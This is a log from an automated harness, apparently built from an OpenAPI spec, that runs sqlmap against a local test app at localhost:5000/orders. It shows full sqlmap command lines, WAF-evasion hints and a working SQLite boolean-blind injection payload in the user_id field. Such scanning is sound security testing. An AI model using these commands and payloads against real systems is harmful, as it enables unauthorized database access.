[19:00:29] [INFO] testing 'Generic inline queries'
[19:00:29] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:00:29] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[19:00:29] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[19:00:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:00:29] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[19:00:29] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[19:00:29] [INFO] testing 'Oracle AND time-based blind'
[19:00:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:00:30] [WARNING] (custom) POST parameter 'JSON product_id' does not seem to be injectable
[19:00:30] [INFO] testing if (custom) POST parameter 'JSON quantity' is dynamic
[19:00:30] [WARNING] (custom) POST parameter 'JSON quantity' does not appear to be dynamic
[19:00:30] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON quantity' might not be injectable
[19:00:30] [INFO] testing for SQL injection on (custom) POST parameter 'JSON quantity'
[19:00:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:00:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:00:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:00:30] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:00:30] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[19:00:31] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[19:00:31] [INFO] testing 'Generic inline queries'
[19:00:31] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:00:31] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[19:00:31] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[19:00:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:00:31] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[19:00:31] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[19:00:31] [INFO] testing 'Oracle AND time-based blind'
[19:00:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:00:31] [WARNING] (custom) POST parameter 'JSON quantity' does not seem to be injectable
[19:00:31] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[19:00:31] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 198 times

[*] ending @ 19:00:31 /2025-09-26/

2025-09-26 19:00:31,745 - INFO - Flushed sqlmap session for http://localhost:5000/orders (log: attack-logs-dynamic\Create_an_order_flush.log)
2025-09-26 19:00:31,745 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/orders --output-dir 'attack-logs-dynamic\Create_an_order_sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"user_id": "1", "product_id": "1", "quantity": "1"}' --technique BU
2025-09-26 19:00:35,045 - INFO -         ___
2025-09-26 19:00:35,045 - INFO -        __H__
2025-09-26 19:00:35,045 - INFO -  ___ ___[']_____ ___ ___  {1.9.9.4#dev}
2025-09-26 19:00:35,045 - INFO - |_ -| . [']     | .'| . |
2025-09-26 19:00:35,045 - INFO - |___|_  [)]_|_|_|__,|  _|
2025-09-26 19:00:35,045 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 19:00:35,045 - INFO - 
2025-09-26 19:00:35,061 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 19:00:35,077 - INFO - 
2025-09-26 19:00:35,077 - INFO - [*] starting @ 19:00:35 /2025-09-26/
2025-09-26 19:00:35,077 - INFO - 
2025-09-26 19:00:36,883 - INFO - [19:00:36] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap' as the output directory
2025-09-26 19:00:37,393 - INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
2025-09-26 19:00:37,393 - INFO - [19:00:37] [INFO] testing connection to the target URL
2025-09-26 19:00:37,716 - INFO - [19:00:37] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 19:00:37,812 - INFO - [19:00:37] [INFO] testing if the target URL content is stable
2025-09-26 19:00:37,986 - INFO - [19:00:37] [INFO] target URL content is stable
2025-09-26 19:00:37,987 - INFO - [19:00:37] [INFO] testing if (custom) POST parameter 'JSON user_id' is dynamic
2025-09-26 19:00:38,371 - INFO - [19:00:38] [WARNING] (custom) POST parameter 'JSON user_id' does not appear to be dynamic
2025-09-26 19:00:38,392 - INFO - [19:00:38] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON user_id' might not be injectable
2025-09-26 19:00:38,410 - INFO - [19:00:38] [INFO] testing for SQL injection on (custom) POST parameter 'JSON user_id'
2025-09-26 19:00:38,474 - INFO - [19:00:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:00:38,519 - INFO - [19:00:38] [WARNING] reflective value(s) found and filtering out
2025-09-26 19:00:39,628 - INFO - [19:00:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:00:40,805 - INFO - [19:00:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:00:42,816 - INFO - [19:00:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:00:43,645 - INFO - [19:00:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:00:44,308 - INFO - [19:00:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:00:44,553 - INFO - [19:00:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:00:44,733 - INFO - [19:00:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:00:44,923 - INFO - [19:00:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:00:45,365 - INFO - [19:00:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:00:45,834 - INFO - [19:00:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 19:00:46,226 - INFO - [19:00:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:00:46,980 - INFO - [19:00:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:00:48,601 - INFO - [19:00:48] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 19:00:49,353 - INFO - [19:00:49] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:00:50,160 - INFO - [19:00:50] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:00:51,044 - INFO - [19:00:51] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:00:51,794 - INFO - [19:00:51] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:00:52,630 - INFO - [19:00:52] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:00:53,498 - INFO - [19:00:53] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:00:54,379 - INFO - [19:00:54] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:00:55,198 - INFO - [19:00:55] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:00:56,072 - INFO - [19:00:56] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:00:56,781 - INFO - [19:00:56] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:00:57,611 - INFO - [19:00:57] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 19:00:57,980 - INFO - [19:00:57] [INFO] (custom) POST parameter 'JSON user_id' appears to be 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' injectable (with --code=200)
2025-09-26 19:00:57,980 - INFO - it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
2025-09-26 19:00:57,990 - INFO - [19:00:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
2025-09-26 19:00:57,990 - INFO - [19:00:57] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
2025-09-26 19:00:58,198 - INFO - [19:00:58] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
2025-09-26 19:00:58,376 - INFO - [19:00:58] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
2025-09-26 19:00:58,552 - INFO - [19:00:58] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
2025-09-26 19:00:58,746 - INFO - [19:00:58] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
2025-09-26 19:00:58,958 - INFO - [19:00:58] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
2025-09-26 19:00:59,116 - INFO - [19:00:59] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
2025-09-26 19:00:59,347 - INFO - [19:00:59] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
2025-09-26 19:00:59,508 - INFO - [19:00:59] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
2025-09-26 19:00:59,706 - INFO - [19:00:59] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
2025-09-26 19:00:59,902 - INFO - [19:00:59] [INFO] checking if the injection point on (custom) POST parameter 'JSON user_id' is a false positive
2025-09-26 19:01:02,330 - INFO - (custom) POST parameter 'JSON user_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
2025-09-26 19:01:02,393 - INFO - sqlmap identified the following injection point(s) with a total of 1826 HTTP(s) requests:
2025-09-26 19:01:02,393 - INFO - ---
2025-09-26 19:01:02,393 - INFO - Parameter: JSON user_id ((custom) POST)
2025-09-26 19:01:02,393 - INFO -     Type: boolean-based blind
2025-09-26 19:01:02,393 - INFO -     Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
2025-09-26 19:01:02,393 - INFO -     Payload: {"user_id": "1 AND CASE WHEN 1176=1176 THEN 1176 ELSE JSON(CHAR(76,122,110,113)) END", "product_id": "1", "quantity": "1"}
2025-09-26 19:01:02,393 - INFO - ---
2025-09-26 19:01:02,403 - INFO - [19:01:02] [INFO] the back-end DBMS is SQLite
2025-09-26 19:01:02,404 - INFO - back-end DBMS: SQLite
2025-09-26 19:01:02,404 - INFO - [19:01:02] [WARNING] HTTP error codes detected during run:
2025-09-26 19:01:02,404 - INFO - 500 (Internal Server Error) - 1804 times
2025-09-26 19:01:02,404 - INFO - [19:01:02] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap\localhost'
2025-09-26 19:01:02,404 - INFO - 
2025-09-26 19:01:02,404 - INFO - [*] ending @ 19:01:02 /2025-09-26/
2025-09-26 19:01:02,404 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/orders --output-dir 'attack-logs-dynamic\Create_an_order_sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"user_id": "1", "product_id": "1", "quantity": "1"}' --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.9.4#dev}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:00:35 /2025-09-26/

[19:00:36] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap' as the output directory
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[19:00:37] [INFO] testing connection to the target URL
[19:00:37] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:00:37] [INFO] testing if the target URL content is stable
[19:00:37] [INFO] target URL content is stable
[19:00:37] [INFO] testing if (custom) POST parameter 'JSON user_id' is dynamic
[19:00:38] [WARNING] (custom) POST parameter 'JSON user_id' does not appear to be dynamic
[19:00:38] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON user_id' might not be injectable
[19:00:38] [INFO] testing for SQL injection on (custom) POST parameter 'JSON user_id'
[19:00:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:00:38] [WARNING] reflective value(s) found and filtering out
[19:00:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:00:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:00:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:00:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:00:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:00:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:00:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:00:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:00:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:00:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[19:00:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:00:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:00:48] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[19:00:49] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:00:50] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:00:51] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:00:51] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:00:52] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:00:53] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:00:54] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[19:00:55] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[19:00:56] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:00:56] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:00:57] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[19:00:57] [INFO] (custom) POST parameter 'JSON user_id' appears to be 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' injectable (with --code=200)
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[19:00:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:00:57] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:00:58] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[19:00:58] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[19:00:58] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[19:00:58] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[19:00:58] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[19:00:59] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[19:00:59] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[19:00:59] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[19:00:59] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[19:00:59] [INFO] checking if the injection point on (custom) POST parameter 'JSON user_id' is a false positive
(custom) POST parameter 'JSON user_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1826 HTTP(s) requests:
---
Parameter: JSON user_id ((custom) POST)
    Type: boolean-based blind
    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
    Payload: {"user_id": "1 AND CASE WHEN 1176=1176 THEN 1176 ELSE JSON(CHAR(76,122,110,113)) END", "product_id": "1", "quantity": "1"}
---
[19:01:02] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[19:01:02] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1804 times
[19:01:02] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap\localhost'

[*] ending @ 19:01:02 /2025-09-26/

2025-09-26 19:01:02,577 - WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Create_an_order_discovery.log
2025-09-26 19:01:02,577 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/orders --output-dir 'attack-logs-dynamic\Create_an_order_sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"user_id": "1", "product_id": "1", "quantity": "1"}' --dbs
2025-09-26 19:01:05,981 - INFO -         ___
2025-09-26 19:01:05,981 - INFO -        __H__
2025-09-26 19:01:05,982 - INFO -  ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 19:01:05,982 - INFO - |_ -| . ["]     | .'| . |
2025-09-26 19:01:05,984 - INFO - |___|_  [']_|_|_|__,|  _|
2025-09-26 19:01:05,985 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 19:01:05,987 - INFO - 
2025-09-26 19:01:06,016 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 19:01:06,016 - INFO - 
2025-09-26 19:01:06,017 - INFO - [*] starting @ 19:01:06 /2025-09-26/
2025-09-26 19:01:06,017 - INFO - 
2025-09-26 19:01:07,828 - INFO - [19:01:07] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap' as the output directory
2025-09-26 19:01:08,358 - INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
2025-09-26 19:01:08,358 - INFO - [19:01:08] [INFO] resuming back-end DBMS 'sqlite'
2025-09-26 19:01:08,368 - INFO - [19:01:08] [INFO] testing connection to the target URL
2025-09-26 19:01:08,512 - INFO - sqlmap resumed the following injection point(s) from stored session:
2025-09-26 19:01:08,513 - INFO - ---
2025-09-26 19:01:08,513 - INFO - Parameter: JSON user_id ((custom) POST)
2025-09-26 19:01:08,514 - INFO -     Type: boolean-based blind
2025-09-26 19:01:08,515 - INFO -     Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
2025-09-26 19:01:08,515 - INFO -     Payload: {"user_id": "1 AND CASE WHEN 1176=1176 THEN 1176 ELSE JSON(CHAR(76,122,110,113)) END", "product_id": "1", "quantity": "1"}
2025-09-26 19:01:08,516 - INFO - ---
2025-09-26 19:01:08,521 - INFO - [19:01:08] [INFO] the back-end DBMS is SQLite
2025-09-26 19:01:08,521 - INFO - back-end DBMS: SQLite
2025-09-26 19:01:08,521 - INFO - [19:01:08] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
2025-09-26 19:01:08,522 - INFO - [19:01:08] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap\localhost'
2025-09-26 19:01:08,522 - INFO - 
2025-09-26 19:01:08,523 - INFO - [*] ending @ 19:01:08 /2025-09-26/
2025-09-26 19:01:08,523 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/orders --output-dir 'attack-logs-dynamic\Create_an_order_sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"user_id": "1", "product_id": "1", "quantity": "1"}' --dbs
--------------------------------------------------
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:01:06 /2025-09-26/

[19:01:07] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap' as the output directory
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[19:01:08] [INFO] resuming back-end DBMS 'sqlite' 
[19:01:08] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON user_id ((custom) POST)
    Type: boolean-based blind
    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
    Payload: {"user_id": "1 AND CASE WHEN 1176=1176 THEN 1176 ELSE JSON(CHAR(76,122,110,113)) END", "product_id": "1", "quantity": "1"}
---
[19:01:08] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[19:01:08] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
[19:01:08] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap\localhost'

[*] ending @ 19:01:08 /2025-09-26/

2025-09-26 19:01:08,725 - WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Create_an_order_dbs.log
2025-09-26 19:01:08,725 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/orders/test
2025-09-26 19:01:12,020 - INFO -         ___
2025-09-26 19:01:12,020 - INFO -        __H__
2025-09-26 19:01:12,020 - INFO -  ___ ___[']_____ ___ ___  {1.9.9.4#dev}
2025-09-26 19:01:12,021 - INFO - |_ -| . [.]     | .'| . |
2025-09-26 19:01:12,021 - INFO - |___|_  ["]_|_|_|__,|  _|
2025-09-26 19:01:12,021 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 19:01:12,021 - INFO - 
2025-09-26 19:01:12,057 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 19:01:12,057 - INFO - 
2025-09-26 19:01:12,057 - INFO - [*] starting @ 19:01:12 /2025-09-26/
2025-09-26 19:01:12,058 - INFO - 
2025-09-26 19:01:14,756 - INFO - [19:01:14] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 19:01:14,756 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 19:01:14,766 - INFO - [19:01:14] [INFO] flushing session file
2025-09-26 19:01:14,776 - INFO - [19:01:14] [INFO] testing connection to the target URL
2025-09-26 19:01:14,839 - INFO - [19:01:14] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 19:01:14,844 - INFO - [19:01:14] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 19:01:14,854 - INFO - [19:01:14] [INFO] testing if the target URL content is stable
2025-09-26 19:01:15,300 - INFO - [19:01:15] [INFO] target URL content is stable
2025-09-26 19:01:15,302 - INFO - [19:01:15] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 19:01:15,336 - INFO - [19:01:15] [INFO] URI parameter '#1*' appears to be dynamic
2025-09-26 19:01:15,347 - INFO - [19:01:15] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 19:01:15,375 - INFO - [19:01:15] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 19:01:15,447 - INFO - [19:01:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:01:15,558 - INFO - [19:01:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:01:15,583 - INFO - [19:01:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:01:15,638 - INFO - [19:01:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 19:01:15,712 - INFO - [19:01:15] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 19:01:15,771 - INFO - [19:01:15] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 19:01:15,826 - INFO - [19:01:15] [INFO] testing 'Generic inline queries'
2025-09-26 19:01:15,839 - INFO - [19:01:15] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 19:01:15,875 - INFO - [19:01:15] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 19:01:15,926 - INFO - [19:01:15] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 19:01:15,966 - INFO - [19:01:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 19:01:16,021 - INFO - [19:01:16] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 19:01:16,066 - INFO - [19:01:16] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 19:01:16,130 - INFO - [19:01:16] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 19:01:16,174 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 19:01:16,174 - INFO - [19:01:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:01:16,229 - INFO - [19:01:16] [WARNING] reflective value(s) found and filtering out
2025-09-26 19:01:16,281 - INFO - [19:01:16] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 19:01:16,281 - INFO - [19:01:16] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 19:01:16,281 - INFO - [19:01:16] [WARNING] HTTP error codes detected during run:
2025-09-26 19:01:16,281 - INFO - 500 (Internal Server Error) - 77 times
2025-09-26 19:01:16,288 - INFO - 
2025-09-26 19:01:16,289 - INFO - [*] ending @ 19:01:16 /2025-09-26/
2025-09-26 19:01:16,289 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/orders/test
--------------------------------------------------
        ___
       __H__
